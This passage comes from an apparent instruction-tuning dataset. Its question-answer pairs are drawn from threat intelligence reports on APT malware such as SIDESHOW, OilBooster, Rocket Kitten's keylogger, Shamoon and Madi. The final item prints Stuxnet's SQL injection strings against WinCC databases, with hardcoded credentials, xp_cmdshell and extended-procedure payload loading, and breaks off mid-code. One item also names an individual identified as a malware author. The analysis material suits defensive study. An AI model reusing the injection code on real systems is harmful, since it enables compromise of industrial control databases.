<8_random_hex_based_on_tickcount> ) are derived using the CPU's current tick count as the random seed value. This results in the value <8_random_hex_based_on_seed> being deterministic, while <8_random_hex_based_on_tickcount> is pseudo-random.\nThe following is an example authentication URI parameter string:\n1pguid=A59&ssln=pAJ9dk4OVq85jxKWoNfw1AG2C&cup2key=184B280E341AE63F\nSIDESHOW parses the response and considers it a successful authentication if it contains the string <!DOCTYPE html> .\nCommand requests use the following URI parameter string format (notice that the <param_2> and <param_3> have switched locations in the string).\n1<param_1>=<5_random_digits>&<param_3>=2<session_id>&<param_2>=<6_random_digits>\nExample command URI parameter string:\n1other=37685&session=2184B280E341AE63F&page=593881\nSIDESHOW parses the command response body and extracts data following the string <!DOCTYPE html> . SIDESHOW then appears to Base64 decode and RC6 decrypt the extracted data. SIDESHOW responds to the commands listed in Table 1 (commands are described on a best effort basis).\n\nBased on the above text, answer a question. How does SIDESHOW communicate with its C2 server, and what steps does it take to authenticate and process commands from the C2 server?",
    "output": "SIDESHOW is a backdoor written in C/C++ that communicates via HTTP POST requests with its C2 server. It is multi-threaded and uses RC6 encryption. SIDESHOW derives a system-specific RC6 key using the same registry values as TOUCHMOVE and uses this key to decrypt a configuration file from disk that contains a list of C2 URLs. SIDESHOW iterates through this C2 URL list and attempts to authenticate to each C2 URL until it is successful. Authentication requests use a URI parameter string format that includes a mix of randomly selected and hard-coded URI parameters. The first URI parameter value comes from SIDESHOW's configuration and is used to seed the random function. The second URI parameter value is hardcoded and likely an authentication credential. The third URI parameter value is a session identifier used for future communications and consists of two subcomponents: one derived from the random seed value and the other from the CPU's current tick count. Command requests use a slightly different URI parameter string format, with the session identifier and other parameters switching places. SIDESHOW parses the command response body, extracts data following the string <!DOCTYPE html>, and then Base64 decodes and RC6 decrypts the extracted data to process commands.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Stonefly APT group use OS Credential Dumping: LSASS Memory in their attacks against high-value targets?",
    "output": "OS Credential Dumping: LSASS Memory is a technique used by adversaries to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). This technique can be used to harvest credential materials and conduct lateral movement using alternate authentication material. In the case of the Stonefly APT group, they have been observed using a credential-dumping tool called Mimikatz, which is capable of dumping LSASS process memory. Specifically, in one of their attacks, they used a masqueraded version of Mimikatz (file name: pl.exe) to dump credentials from the infected machine. This suggests that Stonefly is using OS Credential Dumping: LSASS Memory as part of their attack chain to gain access to sensitive credentials and move laterally within the target network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Network communication\nFor C&C communication and exfiltration, OilBooster uses the Microsoft Graph API to access the shared OneDrive account, using a variety of HTTP GET, POST, PUT, and DELETE requests to the graph.microsoft.com host over the standard 443 port. For brevity, we will also refer to these requests as OneDrive API requests. The encrypted communication is facilitated by the statically linked\nOpenSSL library, which handles the SSL communication.\nTo authenticate with the OneDrive account, OilBooster first obtains the  from the Microsoft identity platform (the authorization server) by sending a POST request with the following body over port 443 to login.microsoftonline.com/common/oauth2/v2.0/token, using hardcoded credentials:\nclient_id=860b23a7-d484-481d-9fea-d3e6e129e249\n&redirect_uri=https://login.live.com/oauth20_desktop.srf\n&client_secret=<redacted>\n&refresh_token=<redacted>\n&grant_type=refresh_token\nOilBooster obtains a new access token this way, which will be used in the Authorization header of the subsequent OneDrive API requests, along with a new refresh token. OilBooster also has a backup channel to request a new refresh token from its C&C server after 10 consecutive unsuccessful connections to the OneDrive server. As shown in Figure 7, the new token can be acquired by sending a simple HTTP GET request on port 80 to host1[.]com/rt.ovf (a legitimate, likely compromised website), which should be followed by the new refresh token in cleartext in the HTTP response.\nThe various network connections made by OilBooster are summarized in Figure 8.\nAnswer this question: How does OilRig's OilBooster utilize the Microsoft Graph API for command and control (C&C) communication and data exfiltration? Describe the authentication process and the role of the OpenSSL library.",
    "output": "OilBooster uses the Microsoft Graph API to communicate with a shared OneDrive account for C&C communication and data exfiltration. This involves sending various HTTP requests (GET, POST, PUT, DELETE) to the graph.microsoft.com host over the standard port 443. The encrypted communication is handled by the statically linked OpenSSL library, which manages SSL communication. To authenticate with the OneDrive account, OilBooster first obtains an access token from the Microsoft identity platform by sending a POST request to login.microsoftonline.com/common/oauth2/v2.0/token with hardcoded credentials. The request includes parameters such as client_id, redirect_uri, client_secret, refresh_token, and grant_type set to 'refresh_token'. Upon successful authentication, OilBooster receives a new access token and refresh token, which are used in the Authorization header of subsequent OneDrive API requests. Additionally, OilBooster has a backup mechanism to request a new refresh token from its C&C server if there are 10 consecutive unsuccessful connections to the OneDrive server. This backup channel involves sending an HTTP GET request to a compromised website, which responds with a new refresh token in cleartext.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why is limited visibility a significant challenge in the threat intelligence production cycle, and how does it impact the completeness of reports?",
    "output": "Limited visibility is a significant challenge because the position of the threat intelligence producer shapes the nature of the research. Different companies have different levels and types of visibility into an attack, leading to incomplete pictures of the operation. For example, endpoint security companies might see payloads without network traffic, while ISPs might see network traffic and victimology without payloads. Claiming perfect awareness over a campaign is therefore short-sighted, as the same actors can continue their efforts with retooled methods. This incompleteness becomes apparent when alternate reports contain vaguely overlapping Indicators of Compromise (IOCs), showcasing the limitations of single-source reports.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT41 complete its missions within compromised environments, and what actions do they take to cover their tracks and exfiltrate data?",
    "output": "APT41 completes its missions by creating a RAR archive of targeted files for exfiltration and manipulating in-game currencies using the targets' databases after compromising production environments. To cover their tracks, APT41 attempts to remove evidence of its activity by deleting Bash histories, clearing Windows security and system events, and modifying DNS management to avoid anti-virus detections. In at least one instance, the group attempted to deploy Encryptor RaaS but was prevented by an operator's typo. In another instance, APT41 deployed XMRig, a Monero cryptocurrency mining tool in a victim's environment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Rocket Kitten APT use exfiltration techniques to steal sensitive data from infected machines?",
    "output": "Exfiltration is a critical phase of an advanced persistent threat (APT) where attackers aim to steal sensitive data from the compromised network. In the case of the Rocket Kitten APT, the attackers employ various exfiltration techniques to extract valuable data from infected machines. According to the findings, the malware used by Rocket Kitten can exfiltrate any file to the remote C&C server, including logs, webcam images, and screenshots. The malware achieves this by breaking down the files into 4Kb chunks and transmitting them to the C&C server, where each chunk frame is sized 0x1014h bytes. Furthermore, the malware reports the file size and transfer status to the C&C server during the exfiltration process. Additionally, the attackers can enumerate all files on the system or find a specific file with the required filename specified by the operator. These techniques demonstrate the sophistication and effectiveness of the Rocket Kitten APT's exfiltration methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are some of the key references cited in the MONSOON report that highlight the historical context and technical details of related cyber threats and tools?",
    "output": "The MONSOON report cites several key references that provide historical context and technical details of related cyber threats and tools. These include 'The Hangover Report' by Bluecoat, which discusses Operation Hangover, and a report by Norman AS titled 'Operation Hangover: Unveiling an Indian Cyberattack Infrastructure.' Additionally, the report references AutoIt, a scripting language used in some of the malware components, and various other sources such as Cymmetria's report on the Patchwork targeted attack, Microsoft Office memory errors, and GitHub repositories containing malware source codes and UAC bypass methods. These references collectively provide a comprehensive background on the tactics, techniques, and procedures used by the adversaries involved in the MONSOON campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Ajax Security Team's use of WHOIS data relate to their targeting of victims in Operation Saffron Rose?",
    "output": "The Ajax Security Team's use of WHOIS data plays a crucial role in their targeting of victims in Operation Saffron Rose. According to the WHOIS description, adversaries may search public WHOIS data for information about victims that can be used during targeting. In the case of Operation Saffron Rose, the attackers used WHOIS data to gather information about potential victims, including their domain registration information and contact details. For instance, historical WHOIS information revealed that the domain aeroconf2014[.]org was registered by keyvan.ajaxtm@gmail[.]com, the same email address used to register the website of the Ajax Security Team. This suggests that the attackers used WHOIS data to identify and target specific individuals or organizations. Furthermore, the attackers' use of WHOIS data allowed them to create convincing phishing emails and websites, such as the fake Aerospace Conference website, which was used to capture user credentials. Overall, the Ajax Security Team's use of WHOIS data demonstrates the importance of this technique in their targeting of victims in Operation Saffron Rose.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: Executive Summary\nThe Shamoon malware has received considerable coverage in the past couple of months because of its destructive nature. Despite assertions that it is the work of amateurs, it has had a major impact on companies believed to have been affected. The basic functions of the malware are to infect, entrench, propagate, and wipe.\nHowever because of the way the malware operates and how it is programmed to wipe, it can find itself being its own enemy. It will wipe data found in the Documents and Settings folder and the System32 folder, and then use a signed driver for disk access to start wiping at the disk level. Because the operating system needs certain files in the System32 folder to run, it was found that infected hosts will always restart before the malware can wipe completely at the disk level.\nDue to this it was possible to make a complete recovery of Shamoon-infected file systems to the state they were in before the wiping made the OS unbootable and unreadable. In fact the majority of files outside of the System32 and Document and Settings folder are recoverable as well; this provided the opportunity for a successful and fruitful analysis, investigation, and remediation effort.\nSmall Headline: Analysis and Testing Overview\nFidelis initially approached the Shamoon analysis strictly from a perspective of determining what forensic artifacts could be recovered from a targeted system. The goal was at least a partial\nreconstruction of the events precipitating the Shamoon attack, and possibly using those events found on the targeted systems to determine a start of the attack, and a possible source. Analysis revealed the possibility that some user data would be recovered as a side benefit to the forensic analysis process.\nThree types of operating systems were used for testing purposes; all testing occurred on laptops. The laptops were wiped, had the operating system installed, and then had the Shamoon malware executed on the system. The three operating systems used for testing were Windows XP, Windows 2003, and Windows 7. The malware executed with no issues except on Windows 7. The User Access Control (UAC) on the Windows 7 systems had to be turned off before the malware would execute and perform the wiping action as has been observed on other machines. This has been noted by others in the community as well, specifically that Administrator access is needed for initially launching Shamoon.\nShamoon operation results in much of the data on the affected systems being overwritten with the fragmented image of a burning flag. As has been detailed above, the wipe function will overwrite data within the Documents and Settings folder followed by the System32 folder, and then it will start the physical disk access and start the wiping at the disk level. If the system restarts before the malware has completed wiping the disk then much of the data can still be recovered: each of our tests showed the system did restart before the disk was completely wiped. The amount wiped from the host will never be the same from system to system, mainly because the size of the disk and partitions will all need to be taken into account.\n\nHow does the Shamoon malware's wiping mechanism interact with the operating system, and why does this interaction potentially allow for data recovery?",
    "output": "The Shamoon malware wipes data in the Documents and Settings folder and the System32 folder, then uses a signed driver for disk access to start wiping at the disk level. However, because the operating system requires certain files in the System32 folder to run, infected hosts will always restart before the malware can completely wipe the disk. This premature restart allows for the potential recovery of the file system to its pre-wiped state. Additionally, most files outside of the System32 and Documents and Settings folders remain recoverable, providing opportunities for successful analysis, investigation, and remediation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Victims\nThe Advtravel server has more than 500 infected systems. All of the stolen details found on it have been backed up for evidence. Most of the data have been analyzed to get an idea as to who have been victimized by the campaign. Some observations made include:\n\u2022 The majority of victims appeared to be Arabs from Egypt.\n\u2022 All of the infected systems appeared to be personal laptops, judging by the presence of a battery indicator in screenshots. This led us to believe that the campaign was not as sophisticated or as targeted as Operation Arid Viper.\n\u2022 The attackers appear to be keenly interested in images stored on victims' systems. This could be a sign that they are looking for incriminating or compromising images for blackmail purposes. As such, the attackers may be less-skilled hackers who are not after financial gain nor hacking for espionage purposes.\n\u2022 A lot of the screenshots unusually showed open Facebook profiles. The victims either spent a lot of time on Facebook every day or the malware took screenshots every time a victim accessed the site. This allowed the attackers to identify their victims. More details on this will be revealed after further investigation.\n\nQuestion: In Operation Arid Viper, what indicators suggest that the attackers might be less-skilled hackers and what motivations could they have?\n\nAnswer:",
    "output": "Several indicators suggest that the attackers in Operation Arid Viper might be less-skilled hackers. Firstly, the majority of victims appeared to be Arabs from Egypt, and all of the infected systems were personal laptops, indicating a less sophisticated or targeted approach compared to typical state-sponsored attacks. Additionally, the attackers showed a keen interest in images stored on victims' systems, which could imply they were looking for incriminating or compromising images for blackmail purposes. This focus on personal data rather than financial gain or espionage suggests motivations that are more aligned with less-skilled hackers. Furthermore, many of the screenshots captured by the malware showed open Facebook profiles, allowing the attackers to identify their victims. This behavior suggests a simpler form of surveillance or identification rather than advanced espionage tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Infostealer analysis: Iexplore.exe\nAll the versions of the infostealer have an Internet Explorer icon, and were written in Delphi.\nThe version used in this article, which appears to have been compiled on 10 June 2012, is packed using UPX 3.08.\nThe file is rather big: 415 KB packed, and 1.14 MB once unpacked.\nOne peculiarity of the infostealer used in the Madi campaign is the heavy use of Delphi Timers. There are 52 of them as you can see on the screenshot below:\n.\nNumerous bugs were discovered during the analysis of the infostealer. Some of them won't be discussed\nhere as we don't want to help the authors improve their malware.\nMedium Headline: TForm4.FormCreate:\nUpon execution, the first activity of interest performed by the infostealer happens inside TForm4.FormCreate.\nIt starts with the setup of a keylogger. In order to do so, Madi infostealer uses the Windows function \"SetWindowsHookEx\" with the \"WH_KEYBOARD_LL\" Id_Hook.\nOnce the keylogger has been installed, the infostealer reads the \"nam.dll\" file (dropped by the downloader) to get the BOT prefix and concatenates it with the computer name. Hereafter this will be referred to as \"BOTID_TMP\". The final BOTID contains some numbers derived from the \"C:\" Volume Serial Number, as we will see later on.\nThe following timers are then disabled in this specific order:\nTimer1, Timer16, Timer18, Timer17, Timer20, Timer19, Timer24, Timer8, Timer30, Timer31, Timer33, Timer34, Timer36, Timer37, Timer38, Timer39, Timer40, Timer41, Timer44, Timer45, Timer46, Timer48, Timer49, Timer50.\nThe malware uses a lot of external files to receive commands, which is another indicator of poor programming skills. Those files are used to inform the malware about the infection status. In order to avoid confusion, hereafter, when referring to a file, it is in the malware directory (\"Templates\" directory), unless stated otherwise.\nThe infostealer looks for the following files:\n\"fsdiskget.dll\": If found, it enables Timer 23 \u2013 otherwise, disables it.\n\"nrbindek.dll\" : If found, it enables Timer 28 \u2013 otherwise, disables it.\n\"specialfile.dll\": If found, it deletes it.\n\"filesend.xls\": Doesn't actually look for it; just tries to delete it.\n\"begirnagir.htp\" : If NOT found, it disables Timer3\n\"filebind.xls\": If found, it enables Timer29 \u2013 otherwise, disables it.\nNext, Timer14 and Timer13 are both disabled.\nThe Trojan looks for \"First.dll\", which is created the first time the malware is executed.\nIf already present, the code returns from TForm4.FormCreate. Otherwise, the following happens.\nIt creates first.dll with a hardcoded stream of bytes (not a real .dll, like the .dll mentioned above, as we will see later on when we analyze the timers more closely).\nLike the downloaders, the infostealer also generates fake files with random names. Before returning from TForm4.FormCreate, 6 loops will be executed:\nXLS: 51 fake XLS files with random names (7 characters) are generated using a hardcoded stream of bytes.\nEXE: 51 fake EXE files with random names (6 characters) are generated using a hardcoded stream of bytes.\nDLL: 201 fake DLL files with random names (9 characters) are generated using a hardcoded stream of bytes.\nTXT: 51 fake TXT files with random names (4 characters) are generated using a hardcoded stream of bytes.\nXML: 51 fake XML files with random names (8 characters) are generated using a hardcoded stream of bytes.\nHTM: 51 fake HTM files with random names (8 characters) are generated using a hardcoded stream of bytes.\nMedium Headline: Keylogger analysis:\nAs mentioned before, the keylogger setup is done in the TForm4.FormCreate. It uses \"SetWindowsHookEx\" with the \"WH_KEYBOARD_LL\" Id_hook to intercept keystrokes.\nThe hook function is rather rudimentary. For instance, it uses the GetAsyncKeyState, with the \"VK_BACK\" to find out if the victim used backspace.\nFor each typed key, there is a handler to save which key was typed in the keylogger buffer \"poki65_pik_log\":\nIt comes as no real surprise that the keylogger is very basic and makes no use of any advanced technologies.\nThe malware uses 52 timers. Therefore, we will group them by actions, in order to make the overall analysis easier to follow.\nBig Headline: Command and control: Protocol\nWe are now going to cover all the timers responsible for contacting the C&C server and receiving commands to execute on the infected machine, and all the various handlers used to execute actions\naccording to those orders.\nNote: In many routines, Madi creates \".bat\" files in order to ping the C&C server to see if it is up or not and saves the result in a special file. Each file has a different name. If these files are referenced, we will provide the timer number responsible for its creation.\nThe server manager looks like this:\nThe GUI was probably rushed, but it serves its purpose. It can be used to create specific tasks for victims. See Timer 12 to see how each command is handled by the infostealer.\n\nWhat role do external files play in the operation of the Madi infostealer, and how does the malware manage these files?",
    "output": "A: The Madi infostealer relies heavily on external files to receive commands and manage its infection status, which is indicative of poor programming skills. These files are typically located in the 'Templates' directory. The malware checks for the presence of specific files such as 'fsdiskget.dll', 'nrbindek.dll', 'specialfile.dll', 'filesend.xls', 'begirnagir.htp', and 'filebind.xls'. Depending on whether these files are found, the malware enables or disables certain timers. For example, if 'fsdiskget.dll' is found, Timer 23 is enabled; if not, it is disabled. Additionally, the malware generates a large number of fake files with random names across various formats (XLS, EXE, DLL, TXT, XML, HTM) to obfuscate its activities and complicate detection efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: WOOLGERED\u2014HOISTED BY THEIR OWN PETARD\nUsing credentials hard-coded into the woolen key-logger, we were able to retrieve numerous woolger DAT files (key-logs), as uploaded from victims around the world.\nAs apparent, the same hard-coded FTP credentials were, in fact, Administrator credentials on the C&C Windows server itself, which had the C$ and D$ NetBIOS/SMB administrative shares openly accessible from the WAN.\nImage 20\u2014if you didn't want to allow researchers to have administrator access to your C&C server <captain_hindsight.png> you shouldn't have hard-coded administrator credentials into your malware.\nAmong many logged keystroke files containing stolen data, we stumbled on an astonishing discovery: the Rocket Kitten attackers had, in fact, infected their own workstations, apparently as 'test-runs' for woolger. The attackers failed to remove these files from the C&C server, demonstrating, yet again, utter lack of OPSEC.\nOf peculiar interest to us were logs made by none other than 'Wool3n.H4t' himself:\nImage 21\u2014The test worked.\nWould you be surprised what followed in the same log file?\nImage 22\u2014The attacker testing his own tool.\nYes, we actually just witnessed Wool3n.H4T switching through his open windows, including a Microsoft Visual Studio live debugging session of a project called\u2026 'CWoolger'\nIn another log, we observe the specific programming of loading of the 'wsc.vbs' script, as observed in the Trend Micro publication and others. At this point, there should be no question\u2014we are looking at the malware author's development workstation.\nImage 23\u2014Mutexes and thread-safety should be the least of your worries.\nThe next log shows us the attacker wanted to test whether his tool would accurately capture credentials entered into a Firefox HTTP authentication prompt, and thus he entered his own C&C server\u2026\nImage 24\nAll of Wool3n.H4T's retrieved logs were dated October 2014.\nThen, we spotted this log segment:\nImage 25 \u2013'AOL Mail' already narrowed it\nRecorded under the Wool3n.H4T name, a user logs into AOL mail with username 'yaserbalaghi.'\nCould it be the same 'Yaser' as noted in the recent Trend Micro and ClearSky paper? ('D:\\Yaser Logers\\CWoolger'\u2026) Could it explain the Phakeddb reference to \"ybsoft\"? We don't know at this point; we have to go deeper.\n'yaserbalaghi@aol.com' appears to give a technical answer in a long C++ thread in an Iranian programmers forum (\"Barname Nevis\") in Iranian 'Solar Hijri' calendar year 1389 (2010-2011):\nThe same yaserbalaghi user made several posts, also linking to various programming instructional videos in the subjects of ASP.NET and AJAX, jQuery and SQL injections as instructed by him using screen capture software.\nCareful watching of the videos allowed us to learn a few interesting details. For starters, Yaser Balaghi is a Microsoft Visual Studio 2010 user, with familiarity of several tools observed to be used during the 'Rocket Kitten' campaign.\nImage 26\u2014Screenshot taken from instructional video by Yaser Balaghi (Engineer Balaghi)\nFurther inspecting the user names and host names evident in the screen captures, we noticed we were actually in possession of logged keystrokes from an \"infected computer\" where the user name was \"Engineer Balaghi,\" strengthening our suspicions. However, we can't be sure yet; Yaser Balaghi may be a common name or perhaps this is someone related to Wool3n.H4T or the attackers.\nA few minutes later, and we spotted this gem of an OPSEC mistake in the SQLi instructional video, which precisely provided the smoking gun we were after:\nImage 28\u2014Watching an hour of Farsi SQL injection tutorial has its rewards\nWool3n.H4t is caught red-handed. One of his many mistakes, he was now caught giving a public tutorial while logged in under his secret alias, otherwise unlinked with his real identity. These videos were recorded February 2014, prior to the first clear Rocket Kitten attack wave mid-year.\nA quick glance on W00l3n.Hat's desktop reveals a striking match with web hacking attack tools previously described in Rocket Kitten's arsenal.\nImage 29\u2014Havij, Acunetix, Netsparker, SQLMap, wamp, and oh\u2014is that IDA properly licensed?\nA few online queries later, we are getting numerous results, cross-referenced to verify as the same Yaser Balaghi, now the main suspect to hold the Wool3n.H4T identity.\nEngineer Yaser Balaghi is not only an active member of various programming forums\u2014he had a web site (www.eng-balaghi.com, gone offline since August 2014, still available in the Wayback Machine). In the available archived version of the site he described himself as a \"programmer, analyst, consultant and lecturer,\" and made himself available for hire.\nImage 30\u2014Yaser Balaghi's stackoverflow account\nIf all that wasn't enough, we also managed to retrieve an updated resume for Tehran-based Engineer Balaghi:\nImage 31 \u2013 Yaser Balaghi's Resume (2013)\nIslamic Azad University Computer Software Graduate Balaghi lists his job experience, including \"Technical Director and Team Leader of Software Development Team (Private)\" (highlighted in original), as well as \"Head of Security and Hacking (legal and ethical) (Private)\". Later, he goes as far as listing sample accomplishments and completed projects, including the development and system design for a \"Phishing Attacks System\" ordered by \"a cyber-organization\".\nWe could go on, but the main lesson of this section can be: if you don't want people to know you created malware for the government, don't list it in your CV.\nBig Headline: REELED IN\u2014PHISHING LOGS ANALYSIS\nAs reported so far, the attackers persistently e-mailed, called and responded with fake identities, tailored for each victim. The attackers clearly read the public reports about them, respond and adapt their tactics, occasionally showing a creative mindset.\nIn one reported case, the attacked posed under the true identity of a ClearSky researcher, referencing the recent Rocket Kitten report, attaching \"detection software\" that does exactly the opposite. This an interesting tactic, worthy of mentioning in social engineering classes.  It would be wise at this point to mention that the release of report does not include any accompanying detection or protection tools other than the existing Check Point software blades. If you received this report with an attached executable, it is likely a malicious lure.\nIn another case, the attackers sent a malicious attachment using the identity of a previously known targeted victim. The Israeli recipient of that attachment was wary enough to suspect the origin of the e-mail and responded with a query: \"Is that you or are the Iranians in your computer again?\" To which the attackers responded (in perfect non-Google-Translate Hebrew): \"The Iranians will never return to my computer!\"\nThat very well may have been the talk of the day at the Tehran operations center, possibly featured in an email printout in the main dining room.\nAs the Rocket Kitten group's behavior was well characterized in previous publications (see the recent report from Trend Micro and ClearSky). We will focus on new insights based on our analysis of the 'Oyun' system victim database. We understand that this database contains a partial view, starting August 2014 to August 2015. While the data can be successfully correlated with logs collected from other servers, we have no visibility of e-mails with malicious attachments (as opposed to phishing links to steal credentials), or any complete web hacking log for attacker activity.\nThe sheer volume of the target database suggests an extensive operation, the work of a group of people over months. The logs included the visiting IP address geo-located country. Our analysis shows the following distribution:\nChart 1\u2014Phishing visitors' country distribution\nWe have studied the visitor data to determine this includes many attacker accesses to test the site functionality. We know the attackers used addresses from Iran, as well as VPN access from the US, Germany, Saudi Arabia and the Netherlands. The data must be interpreted taking these facts into consideration.\nOur primary filtering dismissed around 25% of logs and 15% of projects as 'test runs' for the system. The following is based on the remaining seemingly valid entries.\nCharting the phishing logs over time, we can observe the following timeline:\nChart 2\u2014Phishing logs and successes over time\nWe can study this data to make a few interesting observations:\n\u2022 On average, all phishing pages on this server had 26% success in fooling victims to enter their credentials. These are surprisingly high results, potentially attributed to persistency and well-targeted e-mails.\n\u2022 On May 26, 2015, there is a unique peak of access to the site, with minimal successes. When analyzed, these accesses appear mostly in 3 batches over periods of minutes, with incremental 'project_ids' and no data provided, from Israeli IP addresses. We can safely discard these as researcher probes, attempting to 'brute-force' phishing pages, immediately preceding the ClearSky June publication.\n\u2022 The attackers seem to have shut down their platform on June and July (likely due to the publication) and resumed operations during August. We found evidence to suggest the database had been migrated from a previous server.\nSlicing the projects table by user_id allows a unique internal look on operator assignment; while our target analysis is far from conclusive, we can share a reserved primary assessment of what each user was tasked with:\nDespite our limited visibility, we can confirm many of these attacks were successful\u2014the attackers gained confidential information from various targets all around the world.\nRead the text above and answer this question: How did the investigators gain access to the Rocket Kitten attackers' C&C server, and what critical mistake did the attackers make that facilitated this access?",
    "output": "The investigators gained access to the Rocket Kitten attackers' C&C server by using credentials hard-coded into the woolen key-logger. The attackers made a critical mistake by hard-coding administrator credentials into their malware, which allowed researchers to access the C&C server's administrative shares openly from the WAN.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nWe conducted a detailed technical analysis of the worm Win32/Stuxnet, which currently is perhaps the most technologically sophisticated malicious program developed for a targeted attack to date. We have not released extensive information here about injecting code into the SCADA system, as it deserves an independent discussion (and indeed, has been discussed at length by Langner). This research was intended primarily as material for specialists in information security, showing how technology can be made use of in targeted attacks.\nThanks to everyone who finished reading our report until the end!\nMedium Headline: String 1\ndeclare\n@t varchar(4000),\n@e int,\n@f int if exists (select text from dbo.syscomments where id = object_id(N'[dbo].[MCPVREADVARPERCON]')) select @t = rtrim(text) from dbo.syscomments c, dbo.sysobjects o where o.id = c.id and c.id = object_id(N'[dbo].[MCPVREADVARPERCON]') set @e = charindex(',openrowset', @t) if @e = 0 set @t = right(@t, len(@t) - 7) else begin set @f = charindex('sp_msforeachdb', @t) if @f = 0 begin set @t = left(@t, @e - 1) set @t = right(@t, len(@t) - 7) end else select * from fail_in_order_to_return_false end set @t = 'alter ' + @t + ',openrowset(''SQLOLEDB'',''Server=.\\WinCC;uid=WinCCConnect;pwd=2WSXcder'',''select 0;set IMPLICIT_TRANSACTIONS off;declare @z nvarchar(999);set @z = ''''use [?];declare @t nvarchar(2000);declare @s nvarchar(9);set @s = ''''''''--CC-S'''''''' + char(80);if left(db_name(), 2) = ''''''''CC'''''''' select @t = substring(text, charindex(@s, text) + 8, charindex(''''''''--*'''''''', text) - charindex(@s, text) - 8) from syscomments where text like (''''''''%'''''''' + @s + ''''''''%'''''''');if @t is not NULL exec(@t)'''';exec sp_msforeachdb @z'')' exec (@t)\nMedium Headline: String 5\nview MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID, FORMATFITTING, SCALEID, VARIABLENAME, ADDRESSPARAMETER, PROTOKOLL,MAXLIMIT, MINLIMIT, STARTVALUE, SUBSTVALUE, VARFLAGS, CONNECTIONID, VARPROPERTY, CYCLETIMEID, LASTCHANGE, ASDATASIZE, OSDATASIZE, VARGROUPID, VARXRES, VARMARK, SCALETYPE, SCALEPARAM1, SCALEPARAM2, SCALEPARAM3, SCALEPARAM4 from MCPTVARIABLEDESC, openrowset('SQLOLEDB','Server=.\\WinCC;uid=WinCCConnect;pwd=2WSXcder', 'select 0;declare @t varchar(999),@s varchar(999),@a int declare r cursor for select filename from master..sysdatabases where (name like ''CC%'') open r fetch next from r into @t while (@@fetch_status<>-1) begin set @t=left(@t,len(@t)charindex(''\\'',reverse(@t)))+''\\GraCS\\cc_tlg7.sav'';exec master..xp_fileexist @t,@a out;if @a=1 begin set @s = ''master..xp_cmdshell ''''extrac32 /y \"''+@t+''\" \"''+@t+''x\"'''''';exec(@s);set @t=@t+''x'';dbcc addextendedproc(sp_run,@t);exec master..sp_run;exec master..sp_dropextendedproc sp_run;break;end fetch next from r into @t end close r deallocate r')\nMedium Headline: String 8\nview MCPVREADVARPERCON as select VARIABLEID, VARIABLETYPEID, FORMATFITTING, SCALEID, VARIABLENAME, ADDRESSPARAMETER, PROTOKOLL, MAXLIMIT, MINLIMIT, STARTVALUE, SUBSTVALUE, VARFLAGS, CONNECTIONID, VARPROPERTY, CYCLETIMEID, LASTCHANGE, ASDATASIZE, OSDATASIZE, VARGROUPID, VARXRES, VARMARK, SCALETYPE, SCALEPARAM1, SCALEPARAM2, SCALEPARAM3, SCALEPARAM4 from MCPTVARIABLEDESC, openrowset('SQLOLEDB','Server=.\\WinCC;uid=WinCCConnect;pwd=2WSXcder',\n\"'select 0;use master;declare @t varchar(999),@s varchar(999);select @t=filename from master..sysdatabases where (name like ''CC%'');set @t=left(@t,len(@t)charindex(''\\'',reverse(@t)))+''\\GraCS\\cc_tlg7.sav'';set @s = ''master..xp_cmdshell ''''extrac32 /y \"''+@t+''\" \"''+@t+''x\"'''''';exec(@s);set @t = @t+''x'';dbcc addextendedproc(sprun,@t);exec master..sprun;exec master..sp_dropextendedproc sprun')\nMedium Headline: String 11\nview MCPVREADVARPERCON as select VARIABLEID, VARIABLETYPEID, FORMATFITTING,SCALEID, VARIABLENAME, ADDRESSPARAMETER, PROTOKOLL, MAXLIMIT, MINLIMIT, STARTVALUE, SUBSTVALUE, VARFLAGS, CONNECTIONID, VARPROPERTY, CYCLETIMEID, LASTCHANGE, ASDATASIZE, OSDATASIZE, VARGROUPID, VARXRES, VARMARK, SCALETYPE, SCALEPARAM1, SCALEPARAM2, SCALEPARAM3, SCALEPARAM4 from MCPTVARIABLEDESC, openrowset('SQLOLEDB','Server=.\\WinCC;uid=WinCCConnect;pwd=2WSXcder',\n\"'select 0;use master;declare @t varchar(999),@s varchar(999);select @t=filename from master..sysdatabases where (name like ''CC%R'');set @t=left(@t,len(@t)charindex(''\\'',reverse(@t)))+''\\GraCS\\cc_tlg7.sav'';set @s = ''master..xp_cmdshell_\n''''extrac32 /y \"''+@t+''\" \"''+@t+''x\"'''''';exec(@s);set @t = @t+''x'';dbcc addextendedproc(sp_run,@t);exec master..sp_run;')\nMedium Headline: String 14\nDECLARE\n@ashl int,\n@aind varchar(260),\n@ainf varchar(260),\n@hr int\nEXEC @hr = sp_OACreate 'WScript.Shell', @ashl OUT\nIF @hr <> 0\nGOTO endq\nEXEC sp_OAMethod @ashl, 'ExpandEnvironmentStrings', @aind OUT,\n'%%ALLUSERSPROFILE%%'\nSET @ainf = @aind + '\\sql%05x.dbi'\nDECLARE\n@aods int,\n@adss int,\n@aip int,\n@abf varbinary(4096)\nEXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT\nIF @hr <> 0\nGOTO endq\nEXEC @hr = sp_OASetProperty @aods, 'Type', 1\nIF @hr <> 0\nGOTO endq\nEXEC @hr = sp_OAMethod @aods, 'Open', null\nIF 